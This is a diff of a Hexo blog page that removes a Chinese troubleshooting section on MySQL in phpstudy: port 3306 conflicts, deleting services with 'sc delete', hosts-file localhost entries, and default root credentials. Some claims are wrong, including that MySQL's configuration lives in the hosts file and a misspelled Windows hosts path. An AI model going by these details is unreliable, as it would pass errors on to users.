-<h2 id="雷点"><a href="#雷点" class="headerlink" title="雷点"></a>雷点</h2><h3 id="1-MySQL通道占用"><a href="#1-MySQL通道占用" class="headerlink" title="1.MySQL通道占用"></a>1.MySQL通道占用</h3><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><p>如果你的电脑在之前安装过MySQL并且没有妥善的删除它（像博主一样喜欢直接扔进回收站）或者被一些奇奇怪怪的程序占用，MySQL所使用的3306端口很可能被占用导致服务无法启用</p>
-<h4 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h4><p>打开计算机管理<br>查看服务<br>找到MySQL**长相类似的<br>查看端口<br>确定占用了3306端口<br>关闭服务<br>重启MySQL<br>如果还是不行试试删除服务<br>    1.依次打开“开始菜单——所有程序——附件”<br>    2.右击“命令提示符”，单击“以管理员身份运行”<br>    3.在命令提示符窗口下执行<br>    <code>sc delete 服务名</code></p>
-<h3 id="出现mysql-error-2005-Unknown-MySQL-server-host-‘localhost’-0"><a href="#出现mysql-error-2005-Unknown-MySQL-server-host-‘localhost’-0" class="headerlink" title="出现mysql error 2005 - Unknown MySQL server host ‘localhost’(0)"></a>出现mysql error 2005 - Unknown MySQL server host ‘localhost’(0)</h3><h4 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h4><p>可能你的电脑hosts中没有定义127.0.0.1=localhost</p>
-<h4 id="解决-1"><a href="#解决-1" class="headerlink" title="解决"></a>解决</h4><p>mysql配置文件的存储在hosts文件中，其位置在：<br>Windows：c:\windows\system32\drives\etc\hosts<br>Linux：/etc/hosts<br>打开你会看到</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># For example:</span><br><span class="line">#</span><br><span class="line">#      102.54.94.97     rhino.acme.com          # source server</span><br><span class="line">#       38.25.63.10     x.acme.com              # x client host</span><br><span class="line"></span><br><span class="line"># localhost name resolution is handled within DNS itself.</span><br><span class="line">127.0.0.1       localhost</span><br><span class="line">#	::1             localhost</span><br><span class="line">0.0.0.0 www.bandicam.com</span><br><span class="line">0.0.0.0 bandicam.com</span><br></pre></td></tr></table></figure>
-<p>按例子更改</p>
-<h4 id="问题-2"><a href="#问题-2" class="headerlink" title="问题"></a>问题</h4><p>更改后仍然不能成功启动服务</p>
-<h4 id="解决-2"><a href="#解决-2" class="headerlink" title="解决"></a>解决</h4><p>在有网络的情况下<code>localhost</code>可以被顺利解析为<code>127.0.0.1</code><br>但断网后却会被解析为字符串<br>所以请直接输入127.0.0.1</p>
-<h3 id="密码错误"><a href="#密码错误" class="headerlink" title="密码错误"></a>密码错误</h3><p>phpstudy的初始密码为<code>root\root</code><br>在数据库页面可以快速更改密码</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -908,7 +947,7 @@ phpstudy是一款免费的集成mysql和apeach的网站开发工具，比较适�
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-count">25</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
